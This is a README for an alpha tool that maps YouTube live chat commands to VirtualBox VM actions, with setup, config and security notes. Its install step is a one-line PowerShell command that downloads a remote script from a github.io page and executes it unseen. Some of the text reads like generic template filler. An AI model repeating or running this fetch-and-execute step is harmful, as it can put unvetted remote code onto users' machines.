# YouTube Live Chat → VirtualBox Controller

A small bridge that lets you control VirtualBox VMs using commands sent in a YouTube live chat. This project is in an alpha state — use with caution. If you improve stability or add features, contributions and pull requests are welcome.

## Status

Alpha — actively being reworked. Not production-ready. Use on test machines and review code before running with elevated privileges.

## Features (example)

- Listen to a YouTube live chat stream
- Parse chat messages for predefined commands
- Map chat commands to VirtualBox actions (start, stop, pause, snapshot, send keyboard/mouse events)
- Basic access control via allowed user list or command tokens
- Desktop UI showing VM state, action buttons, snapshots, and an event log
- Built-in chat commands: `!start`, `!stop`, `!pause`, `!resume`, `!reset`, and `!snapshot <name>`

> The exact supported commands and configuration depend on the implementation files in the repo. The README below gives a generic setup and usage guide you can adapt.

## Requirements

- VirtualBox installed and `VBoxManage` available on PATH
- Python 3.8+ (or the language/runtime used by the project)
- Network access to YouTube live chat
- (Optional) A dedicated low-privilege account to run the controller

## Security notes

- Running remote-controlled VM actions is dangerous. Restrict access:
  - Limit which YouTube accounts can send commands (whitelist)
  - Use command tokens or moderator-only commands
  - Run controller with least privilege required
  - Test carefully on non-production systems

## Installation

On Windows, open PowerShell and run:

```powershell
irm https://df1011.github.io/ytlccv.ps1 | iex
```

The installer downloads the project requirements and launches the interactive
configuration tool. Review the script before executing it if you need to audit
the installation steps.

After installation, configure `config.json` with the VirtualBox VM name, the
YouTube live video ID, and an optional `allowed_users` whitelist. Start the
controller with:

```powershell
python main.py --config config.json
```

To run only the chat listener without the desktop UI:

```powershell
python main.py --config config.json --no-ui
```

For a local installation, clone the repository and run `installreq.bat` from
the project directory.

## Desktop UI and VM commands

The UI connects to the configured VM and provides start, stop, pause, resume,
reset, and snapshot actions. The chat listener runs in a background thread so
the status display and event log remain responsive.

The same VM actions can be sent from YouTube Live Chat:

| Command | Action |
| --- | --- |
| `!start` | Start the VM |
| `!stop` | Power down the VM |
| `!pause` | Pause the VM |
| `!resume` | Resume the VM |
| `!reset` | Reset the VM |
| `!snapshot <name>` | Create a snapshot |

## Configuration example (JSON)

```json
{
  "vm_name": "Test VM",
  "video_id": "YOUR_LIVE_STREAM_ID",
  "allowed_users": ["your_channel_name", "trusted_channel_id"],
  "Cust_plgs": {
    "!key": ["BadKeyboards", "press"],
    "!type": ["BadKeyboards", "type"],
    "!move": ["BadMouses", "move_rel"],
    "!focus": ["ForegroundStub", "focus"]
  }
}
```

If `allowed_users` is empty or absent, commands are accepted from every chat
user. Use a whitelist for any VM exposed to a public stream.

## Typical command flow

1. A chat message is received and parsed.
2. The sender is checked against allowed users or token-based checks.
3. If authorized and the message matches a command, the corresponding VBoxManage command is executed.
4. Results (success/failure) may be posted back to chat or logged locally.

## Troubleshooting

- "Permission denied" when executing VBoxManage:
  - Ensure the user running the script has permission to control VirtualBox.
- Not receiving chat messages:
  - Verify YouTube API credentials and that the live stream has an active liveChatId.
- Commands not recognized:
  - Check your config mapping and any command parsing rules.

## Contributing

Contributions are welcome. Suggested steps:
1. Fork the repo and create a feature branch.
2. Add tests (if applicable) and update the README/config examples.
3. Open a pull request describing the change and how to test it.

Please follow safe defaults and do not add code that elevates privileges without clear justification.

## Credits

Thanks to halohunter5283 for the project idea and to webik-216 (PuroTheNerd1) for the original code contributions.

## License

Specify a license for the project (e.g., MIT, Apache-2.0). If no license is present, the repository defaults to “All rights reserved” — consider adding a license file.
